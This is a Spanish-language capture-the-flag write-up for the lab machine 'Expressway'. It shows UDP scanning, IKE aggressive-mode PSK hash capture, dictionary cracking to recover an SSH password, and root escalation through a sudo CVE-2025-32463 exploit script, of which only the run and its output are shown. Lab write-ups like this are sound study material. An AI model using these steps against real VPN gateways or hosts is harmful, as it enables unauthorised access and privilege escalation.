
# Expressway

<figure><img src="/files/d03Tnb4appuXbq2f3HZt" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Expressway`
* **IP:** `10.10.11.87`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `10-10-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.87 expressway.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.10.11.87
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos el puerto 22 abierto, por lo que seguiremos enumerando más.&#x20;

#### Escaneo UDP

Siempre que nos encontremos esta situación en la que solamente encontramos un puerto como el SSH abierto y ningún puerto más vale la pena escanear los puertos UDP en vez de los TCP:

```bash
sudo nmap -sU -sV -T4 10.10.11.87
```

```bash
PORT      STATE         SERVICE         VERSION
68/udp    open|filtered dhcpc
69/udp    open          tftp            Netkit tftpd or atftpd
500/udp   open          isakmp?
688/udp   open|filtered realm-rusd
4500/udp  open|filtered nat-t-ike
17989/udp open|filtered unknown
18821/udp open|filtered unknown
24606/udp open|filtered unknown
30263/udp open|filtered unknown
32778/udp open|filtered sometimes-rpc20
47981/udp open|filtered unknown
53838/udp open|filtered unknown
59765/udp open|filtered unknown
61961/udp open|filtered unknown
```

Encontramos 2 puertos abiertos y muchos marcados como filtrados, por lo que dirigiremos un escaneo contra esos puertos para buscar alguna vulnerabilidad:

```bash
sudo nmap -v -sU -p 69,500 -A -T4 expressway.htb -oX scan.xml
```

```q
PORT      STATE         SERVICE        VERSION
69/udp    open          tftp           Netkit tftpd or atftpd
| tftp-version: 
|   cpe: 
|     cpe:/a:netkit:netkit
|     cpe:/a:lefebvre:atftpd
|_  p: Netkit tftpd or atftpd
500/udp   open          isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

El puerto que más nos llama la atención en el 69. TFTP es un protocolo de transferencia de archivos simple que a menudo carece de autenticación, y la exposición de la versión específica permite a los atacantes identificar vulnerabilidades conocidas (CVEs) asociadas con ese software.

Después de enumerarlo no encontramos nada:

```bash
tftp 10.10.11.87

tftp> mode octet
tftp> get config
Error code 1: File not found
tftp> get boot
Error code 1: File not found
tftp> get /etc/passwd
Error code 1: File not found
tftp> get /etc/shadow
Error code 1: File not found
```

### Enumeración y explotación de IKE <a href="#ca14" id="ca14"></a>

Por el puerto 500 nos encontramos el servicio IKE que expone un handshake y un email que nos puede indicar el usuario ike: `ike@expressway.htb`

```bash
sudo ike-scan -A -Ppsk.txt 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=9daa1690ec6a028e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.059 seconds (16.96 hosts/sec).  1 returned handshake; 0 returned notify
```

Con esto conseguimos:

* `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)` - Se filtró la identidad de IKE.
* Se devolvió un hash PSK de 20 bytes y se guardó en `psk.txt`.

### Cracking de PSK

```shell-session
afsh4ck@kali$ sudo ike-scan -M --aggressive  10.10.11.87 -n ike@expressway.htb --pskcrack=hash.txt

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=17982eb31b0c9b33)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.044 seconds (22.88 hosts/sec).  1 returned handshake; 0 returned notify
```

Eso nos genera el hash para crackearlo:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ cat psk.txt

810fce41d349cb229417fa0a46fc2c9ec4011bb26cd1896b9471ef44e93f6de237c74a0714bed68a4ad24d2b83c04c4f4e4db5a2d069f1db6c1cae8b0a01a7d06e041a2a813435d1ea85cb73790e04ddf5c3af9e6109931653ba8296bc62f65929eb0f951235d74debe7099357890adb07a5733b15f330bb13ba727da3018bcb:fed7c8f3dd332aed79c5b2e18f177b312160d2fb5cc2a69370d852c74123ba1b81df0c496b1004ed474a69c68e28b50c5055d6c4bdfdd17c95a19bcec2bb64fde32bcb2e5edde81ad6f2b4b8985a16179326dd548fe21698059f0ef161595c86f18b07e41d04f52555f20a3c5fe0b87b8ffd225af86f9aec6efa51d64dcc8377:62c6a74d683f3726:4f60459cb8499052:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:fc5772f5246c65f82d475e5b0f8ce82eb983e43e:904e3f2bc192503d3cd9a37d42e52a3a5fe14bf3d1bc83cae82d929ed2841aef:520dab1d6eb065fc9bc14ff78cfb75cebe8b8965
```

{% endcode %}

Luego ejecutamos un ataque de diccionario offline contra el hash capturado.

```shell-session
afsh4ck@kali$ psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
                         
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash c8fb600fb125eb8757eefa9e9c56f94fb42f439c
Ending psk-crack: 8045040 iterations in 4.221 seconds (1905763.15 iterations/sec)
```

Encontramos la clave: `freakingrockstarontheroad`

### Acceso SSH

Probamos la contraseña para acceder por SSH y funciona:

```shell-session
afsh4ck@kali$ ssh ike@10.10.11.87

ike@10.10.11.87's password: 
Last login: Wed Oct  8 17:54:01 BST 2025 from 10.10.14.188 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 8 20:51:00 2025 from 10.10.14.234

ike@expressway:~$ whoami
ike
```

***

## <mark style="color:purple;">User Flag</mark>

En la home del usuario ike encontramos la user flag:

```bash
ike@expressway:~$ ls
linpeas.sh  user.txt

ike@expressway:~$ cat user.txt 
45dee78f984509e24517f***********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario ike:

```shell-session
ike@expressway:~$ sudo -l
Sorry, user ike may not run sudo on expressway.
```

### Versión de SUDO

```shell-session
ike@expressway:~$ sudo -V
Sudo version 1.9.17
```

Esta versión de sudo es vulnerable al CVE-2025-32463, y encontramos varios PoC para explotarlo:

{% embed url="<https://github.com/KaiHT-Ladiant/CVE-2025-32463>" %}

#### Explotación

```shell-session
ike@expressway:/tmp$ nano cve-2025-32463.sh
ike@expressway:/tmp$ chmod +x cve-2025-32463.sh

ike@expressway:/tmp$ ./cve-2025-32463.sh
[*] Exploiting CVE-2025-32463...
[*] Attempting privilege escalation...

root@expressway:/# whoami
root
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```shell-session
root@expressway:/# cd /root
root@expressway:/root# ls
root.txt
root@expressway:/root# cat root.txt
8908ac9f39890ff6a0d5d2************
```
